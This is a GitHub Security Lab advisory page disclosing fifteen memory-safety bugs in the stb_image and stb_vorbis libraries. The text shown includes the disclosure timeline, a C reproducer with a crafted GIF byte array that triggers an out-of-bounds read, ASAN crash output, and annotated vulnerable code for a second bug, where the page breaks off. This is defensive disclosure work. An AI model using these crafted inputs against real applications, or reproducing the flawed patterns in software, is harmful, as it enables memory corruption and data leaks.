<!DOCTYPE html>
<html lang="en">

<head>
    <!-- META DATA -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="preload" href="/assets/css/index.css" as="style">
    <link rel="preload" href="/assets/js/main.js" as="script">
    <!--[if IE]><meta http-equiv="cleartype" content="on" /><![endif]-->
    <link rel="canonical" href="https://securitylab.github.com/advisories/GHSL-2023-145_GHSL-2023-151_stb_image_h/">
    <link rel="alternate" type="application/rss+xml" title="GitHub Security Lab" href="/feed.xml">
    <link rel="stylesheet" media="screen" href="/assets/css/index.css" />
    <script async src="https://js.maxmind.com/js/apis/geoip2/v2.1/geoip2.js"></script>
    <script src="/assets/js/jquery.js"></script>
    <link id="favicon" rel="shortcut icon" type="image/ico" href="/assets/img/favicons/favicon.png" />
    <link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" />
    <link rel="icon" href="/assets/img/favicons/android-favicon.png">
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>GHSL-2023-145_GHSL-2023-151/GHSL-2023-165_GHSL-2023-172: Several memory access violations in stb_image and stb_vorbis | GitHub Security Lab</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="GHSL-2023-145_GHSL-2023-151/GHSL-2023-165_GHSL-2023-172: Several memory access violations in stb_image and stb_vorbis" />
<meta name="author" content="jarlob" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="stb_image and stb_vorbis libraries contain several memory access violations of different severity." />
<meta property="og:description" content="stb_image and stb_vorbis libraries contain several memory access violations of different severity." />
<link rel="canonical" href="https://securitylab.github.com/advisories/GHSL-2023-145_GHSL-2023-151_stb_image_h/" />
<meta property="og:url" content="https://securitylab.github.com/advisories/GHSL-2023-145_GHSL-2023-151_stb_image_h/" />
<meta property="og:site_name" content="GitHub Security Lab" />
<meta property="og:image" content="https://securitylab.github.com/assets/img/social-card.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-10-19T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://securitylab.github.com/assets/img/social-card.png" />
<meta property="twitter:title" content="GHSL-2023-145_GHSL-2023-151/GHSL-2023-165_GHSL-2023-172: Several memory access violations in stb_image and stb_vorbis" />
<meta name="twitter:site" content="@GHSecurityLab" />
<meta name="twitter:creator" content="@jarlob" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"jarlob"},"dateModified":"2023-10-19T00:00:00+00:00","datePublished":"2023-10-19T00:00:00+00:00","description":"stb_image and stb_vorbis libraries contain several memory access violations of different severity.","headline":"GHSL-2023-145_GHSL-2023-151/GHSL-2023-165_GHSL-2023-172: Several memory access violations in stb_image and stb_vorbis","image":"https://securitylab.github.com/assets/img/social-card.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://securitylab.github.com/advisories/GHSL-2023-145_GHSL-2023-151_stb_image_h/"},"url":"https://securitylab.github.com/advisories/GHSL-2023-145_GHSL-2023-151_stb_image_h/"}</script>
<!-- End Jekyll SEO tag -->

    
    <meta name="ha-url" content="https://collector.githubapp.com/securitylab-website/collect">
    <script src="https://analytics.githubassets.com/hydro-marketing.min.js"></script>
</head>
  


<body class="no-js page-/advisories/GHSL-2023-145_GHSL-2023-151_stb_image_h page-blog">
  <a class="skip-to-content" href="#content">skip to content</a>

  <div
  id="site-navigation-container"
  class="site-navigation-container position-fixed top-0 width-full color-bg-transparent"
>
  <div
    className="position-relative site-navigation-container--background hide-sm hide-md"
  >
    <nav class="site-navigation nav d-block">
      <div
        class="container-xl py-2 d-none d-lg-flex flex-items-center flex-justify-between gap-0"
      >
        <a
          role="tab"
          title="Github"
          class="nav-logo"
          href="https://github.com"
          target="_blank"
        >
          <svg
            aria-hidden="true"
            role="img"
            class="nav-back-arrow position-absolute"
            viewBox="0 0 24 24"
            width="32"
            height="32"
            fill="currentColor"
            style="
              display: inline-block;
              user-select: none;
              vertical-align: text-bottom;
              overflow: visible;
            "
          >
            <path
              fill-rule="evenodd"
              d="M15.28 5.22a.75.75 0 00-1.06 0l-6.25 6.25a.75.75 0 000 1.06l6.25 6.25a.75.75 0 101.06-1.06L9.56 12l5.72-5.72a.75.75 0 000-1.06z"
            ></path>
          </svg>
          <svg
            height="32"
            class="octicon octicon-mark-github mr-2"
            viewBox="0 0 16 16"
            version="1.1"
            width="32"
            aria-hidden="true"
          >
            <path
              fill-rule="evenodd"
              d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"
            ></path>
          </svg>
        </a>
        <span class="Slash-item"> / </span>
        <a
          aria-current="page"
          role="tab"
          title="Security Lab"
          class="nav-item nav-item--logo"
          href="/"
          >Security Lab</a
        >

        <div
          class="nav-body flex-auto flex-justify-start hide-sm hide-md"
          role="tablist"
        >
          <a
            role="tab"
            title="Research"
            class="nav-item"
            href="https://github.blog/tag/github-security-lab/"
            target="_blank"
            >Research</a
          >
          <a
            role="tab"
            title="Advisories"
            class="nav-item"
            href="/advisories/"
            >Advisories</a
          >
          <a
            role="tab"
            title="CodeQL Wall of Fame"
            class="nav-item"
            href="/codeql-wall-of-fame/"
            >CodeQL Wall of Fame</a
          >
          <button
            aria-label="Menu"
            aria-expanded="false"
            class="nav-item nav-item-button js-dropdown-menu-trigger"
          >
            Resources
          </button>
          <a
            role="tab"
            title="Events"
            class="nav-item"
            href="/events/"
            >Events</a
          >
        </div>

        <a
          href="/get-involved/"
          class="btn-get-involved hide-sm hide-md"
          ><span>Get Involved</span></a
        >
      </div>
    </nav>
  </div>

  <div
    class="navigation-dropdown left-0 width-full position-absolute color-bg-dark py-6"
  >
    <ul class="container-xl py-5 site-navigation__dropdown">
      <li class="pb-4 dropdown-title col-4">Resources</li>
      <li class="dropdown-nav-item col-4 py-2">
        <a
          role="tab"
          title="Home"
          class=" "
          href="/open-source"
          >Open Source Community</a
        >
      </li>
      <li class="dropdown-nav-item col-4 py-2">
        <a
          role="tab"
          title="Home"
          class=""
          href="/enterprise"
          >Enterprise</a
        >
      </li>
    </ul>
  </div>
</div>

<div
  class="mobile-navbar hide-lg hide-xl d-flex flex-items-center flex-justify-start"
>
  <a
    role="tab"
    title="Github"
    class="nav-logo"
    href="https://github.com"
    target="_blank"
  >
    <svg
      height="32"
      class="octicon octicon-mark-github mr-2"
      viewBox="0 0 16 16"
      version="1.1"
      width="32"
      aria-hidden="true"
    >
      <path
        fill-rule="evenodd"
        d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"
      ></path>
    </svg>
  </a>
  <span class="Slash-item"> / </span>
  <a
    aria-current="page"
    role="tab"
    title="Security Lab"
    class="top-nav-item nav-item nav-item--logo"
    href="/"
    >Security Lab</a
  >
  <button
    aria-label="Menu"
    aria-expanded="false"
    class="sc-VigVT sc-jzJRlG nav-dropdown js-menu-trigger"
  >
    <svg
      class="caret-button"
      width="14"
      height="9"
      viewBox="0 0 14 9"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path
        fill-rule="evenodd"
        clip-rule="evenodd"
        d="M13.7803 0.71967C14.0732 1.01256 14.0732 1.48744 13.7803 1.78033L7.53033 8.03033C7.23744 8.32322 6.76256 8.32322 6.46967 8.03033L0.21967 1.78033C-0.0732231 1.48744 -0.0732231 1.01256 0.21967 0.71967C0.512563 0.426777 0.987437 0.426777 1.28033 0.71967L7 6.43934L12.7197 0.71967C13.0126 0.426777 13.4874 0.426777 13.7803 0.71967Z"
        fill="#24292F"
      />
    </svg>
  </button>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const toggleNavBtn = document.querySelector(".nav-dropdown");
      const mobileNav = document.querySelector(".mobile-nav");
      const caretIcon = document.querySelector(".caret-button");
      const backdrop = document.querySelector(".mobile-nav-screen");
      function toggleNavigation(event) {
        event.preventDefault();
        const expanded = toggleNavBtn.getAttribute("aria-expanded") === "true";

        toggleNavBtn.setAttribute("aria-expanded", !expanded);
        mobileNav.classList.toggle("expanded", !expanded);
        backdrop.classList.toggle("active", !expanded);

      }
      toggleNavBtn.addEventListener("click", toggleNavigation);
      toggleNavBtn.addEventListener("touchstart", toggleNavigation);

      backdrop.addEventListener("click", toggleNavigation);
      backdrop.addEventListener("touchstart", toggleNavigation);
    });
  </script>
</div>

<div class="mobile-nav">
  <div class="">
    <a
      role="tab"
      title="Research"
      class="nav-item "
      href="https://github.blog/tag/github-security-lab/"
      >Research</a
    >
    <a
      role="tab"
      title="Advisories"
      class="nav-item "
      href="/advisories/"
      >Advisories</a
    >
    <a
      role="tab"
      title="CodeQL Wall of Fame"
      class="nav-item "
      href="/codeql-wall-of-fame/"
      >CodeQL Wall of Fame</a
    >
    <div class="nav-item resources">
      <div
        class="nav-dropdown-item d-flex flex-justify-between flex-items-center"
      >
        <span>Resources</span>
        <svg
          class="mobile-caret"
          width="12"
          height="7"
          viewBox="0 0 12 7"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            fill-rule="evenodd"
            clip-rule="evenodd"
            d="M11.6502 0.266554C11.8943 0.510632 11.8943 0.90636 11.6502 1.15044L6.44186 6.35877C6.19778 6.60285 5.80205 6.60285 5.55798 6.35877L0.349644 1.15044C0.105566 0.90636 0.105566 0.510632 0.349644 0.266554C0.593721 0.0224767 0.98945 0.0224767 1.23353 0.266554L5.99992 5.03295L10.7663 0.266554C11.0104 0.0224767 11.4061 0.0224767 11.6502 0.266554Z"
            fill="white"
          />
        </svg>
      </div>

      <div class="sub-menu">
        <a
          role="tab"
          title="Open Source Community"
          class="nav-inner-item "
          href="/open-source"
          >Open Source Community</a
        >
        <a
          role="tab"
          title="Enterprise"
          class="nav-inner-item "
          href="/enterprise"
          >Enterprise</a
        >
      </div>
    </div>
    <a
      role="tab"
      title="Events"
      class="nav-item "
      href="/events/"
      >Events</a
    >
    <a
      role="tab"
      title="Events"
      class="nav-item "
      href="/get-involved/"
      >Get Involved</a
    >
  </div>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const resources = document.querySelector(".nav-item.resources");
      const caret = resources.querySelector(".mobile-caret");
      const subMenu = resources.querySelector(".sub-menu");

      resources.addEventListener("click", function () {
        resources.classList.toggle("active");

        if (resources.classList.contains("active")) {
          // Force reflow
          subMenu.style.maxHeight = subMenu.scrollHeight + "px";
          subMenu.style.opacity = 1;
        } else {
          // Force reflow
          subMenu.style.maxHeight = "0";
          subMenu.style.opacity = 0;
        }
      });
    });
  </script>
</div>
<span class="mobile-nav-screen js-menu-trigger"></span>

<span class="dropdown-nav-screen js-dropdown-menu-trigger"></span>


  <div class="container-xl post-container p-responsive mt-md-76">
    <header class="post-header ">
      <div class="date text-mono mb-3 mb-md-2">October 19, 2023</div>
      <h1 class="page-title mb-3 mb-md-4 ">GHSL-2023-145_GHSL-2023-151/GHSL-2023-165_GHSL-2023-172: Several memory access violations in stb_image and stb_vorbis</h1>

      
      
      
      
      

      

      <a target="_blank" class="mx-auto sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396" alt="Author avatar" height="35" width="35">
        <span>Jaroslav Lobačevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body post-content" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2023-07-13: stb_image report with issues and fix suggestions was sent privately to the maintainers.</li>
  <li>2023-07-13/17: Created public pull requests for additional issues such as memory leaks.</li>
  <li>2023-07-17: stb_vorbis report with issues and fix suggestions was sent privately to the maintainers.</li>
  <li>2023-07-17: Requested confirmation of report receipt.</li>
  <li>2023-07-17: Received confirmation.</li>
  <li>2023-09-05: Requested update on reported issues. No reply received.</li>
  <li>2023-09-22: Requested update on reported issues. No reply received.</li>
  <li>2023-10-09: Followed up with offer to create public pull requests for all reported issues. No reply received.</li>
  <li>2023-10-19: Created pull requests for security related issues.</li>
  <li>2023-10-19: Publishing according to our <a href="https://securitylab.github.com/disclosures#policy">coordinated disclosure policy</a>.</li>
</ul>

<h2 id="summary">Summary</h2>

<p><a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h">stb_image.h</a> and <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c">stb_vorbis</a> libraries contain several memory access violations of different severity.</p>

<ol>
  <li><a href="#issue-1-wild-address-read-in-stbi__gif_load_next-ghsl-2023-145">Wild address read in stbi__gif_load_next (<code class="language-plaintext highlighter-rouge">GHSL-2023-145</code>).</a></li>
  <li><a href="#issue-2-multi-byte-read-heap-buffer-overflow-in-stbi__vertical_flip-ghsl-2023-146">Multi-byte read heap buffer overflow in <code class="language-plaintext highlighter-rouge">stbi__vertical_flip</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-146</code>).</a></li>
  <li><a href="#issue-3-disclosure-of-uninitialized-memory-in-stbi__tga_load-ghsl-2023-147">Disclosure of uninitialized memory in <code class="language-plaintext highlighter-rouge">stbi__tga_load</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-147</code>).</a></li>
  <li><a href="#issue-4-double-free-in-stbi__load_gif_main_outofmem-ghsl-2023-148">Double-free in <code class="language-plaintext highlighter-rouge">stbi__load_gif_main_outofmem</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-148</code>).</a></li>
  <li><a href="#issue-5-null-pointer-dereference-in-stbi__convert_format-ghsl-2023-149">Null pointer dereference in <code class="language-plaintext highlighter-rouge">stbi__convert_format</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-149</code>).</a></li>
  <li><a href="#issue-6-possible-double-free-or-memory-leak-in-stbi__load_gif_main-ghsl-2023-150">Possible double-free or memory leak in <code class="language-plaintext highlighter-rouge">stbi__load_gif_main</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-150</code>).</a></li>
  <li><a href="#issue-7-null-pointer-dereference-because-of-an-uninitialized-variable-ghsl-2023-151">Null pointer dereference because of an uninitialized variable (<code class="language-plaintext highlighter-rouge">GHSL-2023-151</code>).</a></li>
  <li><a href="#issue-8-0-byte-write-heap-buffer-overflow-in-start_decoder-ghsl-2023-165"><code class="language-plaintext highlighter-rouge">0</code> byte write heap buffer overflow in <code class="language-plaintext highlighter-rouge">start_decoder</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-165</code>)</a></li>
  <li><a href="#issue-9-multi-byte-write-heap-buffer-overflow-in-start_decoder-ghsl-2023-166">Multi-byte write heap buffer overflow in <code class="language-plaintext highlighter-rouge">start_decoder</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-166</code>)</a></li>
  <li><a href="#issue-10-heap-buffer-out-of-bounds-write-in-start_decoder-ghsl-2023-167">Heap buffer out of bounds write in <code class="language-plaintext highlighter-rouge">start_decoder</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-167</code>)</a></li>
  <li><a href="#issue-11-off-by-one-heap-buffer-write-in-start_decoder-ghsl-2023-168">Off-by-one heap buffer write in <code class="language-plaintext highlighter-rouge">start_decoder</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-168</code>)</a></li>
  <li><a href="#issue-12-attempt-to-free-an-uninitialized-memory-pointer-in-vorbis_deinit-ghsl-2023-169">Attempt to free an uninitialized memory pointer in <code class="language-plaintext highlighter-rouge">vorbis_deinit</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-169</code>)</a></li>
  <li><a href="#issue-13-null-pointer-dereference-in-vorbis_deinit-ghsl-2023-170">Null pointer dereference in <code class="language-plaintext highlighter-rouge">vorbis_deinit</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-170</code>)</a></li>
  <li><a href="#issue-14-out-of-bounds-heap-buffer-write-ghsl-2023-171">Out of bounds heap buffer write (<code class="language-plaintext highlighter-rouge">GHSL-2023-171</code>)</a></li>
  <li><a href="#issue-15-wild-address-read-in-vorbis_decode_packet_rest-ghsl-2023-172">Wild address read in <code class="language-plaintext highlighter-rouge">vorbis_decode_packet_rest</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-172</code>)</a></li>
</ol>

<h2 id="product">Product</h2>

<p><a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h">stb_image.h</a> and <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c">stb_vorbis</a></p>

<h2 id="tested-version">Tested Version</h2>

<p>stb_image - <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h">v2.28</a><br />
stb_vorbis - <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c">v1.22</a></p>

<h2 id="details">Details</h2>

<h3 id="issue-1-wild-address-read-in-stbi__gif_load_next-ghsl-2023-145">Issue 1: Wild address read in stbi__gif_load_next (<code class="language-plaintext highlighter-rouge">GHSL-2023-145</code>)</h3>

<p>A crafted image file may trigger out of bounds <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6817"><code class="language-plaintext highlighter-rouge">memcpy</code></a> read in <code class="language-plaintext highlighter-rouge">stbi__gif_load_next</code>. This happens because <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L7021-L7022"><code class="language-plaintext highlighter-rouge">two_back</code> points to a memory address lower than the start of the buffer <code class="language-plaintext highlighter-rouge">out</code></a>.</p>

<h4 id="impact">Impact</h4>

<p>This issue may be used to leak internal memory allocation information.
s</p>
<h4 id="resources">Resources</h4>

<p>To reproduce the issue:</p>

<ol>
  <li>Make ASAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#define STB_IMAGE_IMPLEMENTATION
#include</span> <span class="cpf">"../stb_image.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xdf</span><span class="p">,</span><span class="mh">0x79</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span>
                            <span class="mh">0x43</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x3f</span><span class="p">,</span><span class="mh">0x71</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span>
                            <span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0xf9</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0x0a</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x1f</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x71</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x27</span><span class="p">,</span>
                            <span class="mh">0x8e</span><span class="p">,</span><span class="mh">0x64</span><span class="p">,</span><span class="mh">0x68</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">,</span> <span class="n">channels</span><span class="p">;</span>
    <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">img</span> <span class="o">=</span> <span class="n">stbi_load_gif_from_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">y</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">z</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channels</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
    <span class="n">stbi_image_free</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AddressSanitizer:DEADLYSIGNAL
=================================================================
==34019==ERROR: AddressSanitizer: SEGV on unknown address 0x7efdf91e0ae8 (pc 0x7efe05a0ac23 bp 0x7ffd4ee08700 sp 0x7ffd4ee07ec8 T0)
==34019==The signal is caused by a READ memory access.
    #2 0x4e4156 in stbi__gif_load_next(stbi__context*, stbi__gif*, int*, int, unsigned char*) tests/../stb_image.h:6817:16
    #3 0x4dee75 in stbi__load_gif_main(stbi__context*, int**, int*, int*, int*, int*, int) tests/../stb_image.h:6983:14
    #4 0x4de8bd in stbi_load_gif_from_memory tests/../stb_image.h:1448:30
</code></pre></div></div>

<h3 id="issue-2-multi-byte-read-heap-buffer-overflow-in-stbi__vertical_flip-ghsl-2023-146">Issue 2: Multi-byte read heap buffer overflow in <code class="language-plaintext highlighter-rouge">stbi__vertical_flip</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-146</code>)</h3>

<p>When <code class="language-plaintext highlighter-rouge">stbi_set_flip_vertically_on_load</code> is set to <code class="language-plaintext highlighter-rouge">TRUE</code> and <code class="language-plaintext highlighter-rouge">req_comp</code> is set to a number that doesn’t match the real number of components per pixel, the library attempts to flip the image vertically.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">stbi_set_flip_vertically_on_load</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="n">stbi_uc</span> <span class="o">*</span><span class="n">img</span> <span class="o">=</span> <span class="n">stbi_load_gif_from_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">delays</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">y</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">z</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channels</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</code></pre></div></div>

<p>A crafted image file can trigger <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1235">memcpy</a> [3] out-of-bounds read because <code class="language-plaintext highlighter-rouge">bytes_per_pixel</code> [1] used to calculate <code class="language-plaintext highlighter-rouge">bytes_per_row</code> [2] doesn’t match the real <code class="language-plaintext highlighter-rouge">image</code> array dimensions.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">stbi__vertical_flip</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">image</span><span class="p">,</span> <span class="kt">int</span> <span class="n">w</span><span class="p">,</span> <span class="kt">int</span> <span class="n">h</span><span class="p">,</span> <span class="kt">int</span> <span class="n">bytes_per_pixel</span> <span class="cm">/* [1] */</span><span class="p">)</span>
<span class="p">{</span>
   <span class="kt">int</span> <span class="n">row</span><span class="p">;</span>
   <span class="kt">size_t</span> <span class="n">bytes_per_row</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">w</span> <span class="o">*</span> <span class="n">bytes_per_pixel</span><span class="p">;</span> <span class="c1">// [2]</span>
   <span class="n">stbi_uc</span> <span class="n">temp</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
   <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">bytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">stbi_uc</span> <span class="o">*</span><span class="p">)</span><span class="n">image</span><span class="p">;</span>

   <span class="k">for</span> <span class="p">(</span><span class="n">row</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">row</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">h</span><span class="o">&gt;&gt;</span><span class="mi">1</span><span class="p">);</span> <span class="n">row</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">row0</span> <span class="o">=</span> <span class="n">bytes</span> <span class="o">+</span> <span class="n">row</span><span class="o">*</span><span class="n">bytes_per_row</span><span class="p">;</span>
      <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">row1</span> <span class="o">=</span> <span class="n">bytes</span> <span class="o">+</span> <span class="p">(</span><span class="n">h</span> <span class="o">-</span> <span class="n">row</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="n">bytes_per_row</span><span class="p">;</span>
      <span class="c1">// swap row0 with row1</span>
      <span class="kt">size_t</span> <span class="n">bytes_left</span> <span class="o">=</span> <span class="n">bytes_per_row</span><span class="p">;</span>
      <span class="k">while</span> <span class="p">(</span><span class="n">bytes_left</span><span class="p">)</span> <span class="p">{</span>
         <span class="kt">size_t</span> <span class="n">bytes_copy</span> <span class="o">=</span> <span class="p">(</span><span class="n">bytes_left</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span> <span class="o">?</span> <span class="n">bytes_left</span> <span class="o">:</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">temp</span><span class="p">);</span>
         <span class="n">memcpy</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">row0</span><span class="p">,</span> <span class="n">bytes_copy</span><span class="p">);</span>
         <span class="n">memcpy</span><span class="p">(</span><span class="n">row0</span><span class="p">,</span> <span class="n">row1</span><span class="p">,</span> <span class="n">bytes_copy</span><span class="p">);</span> <span class="c1">// [3] OOB</span>
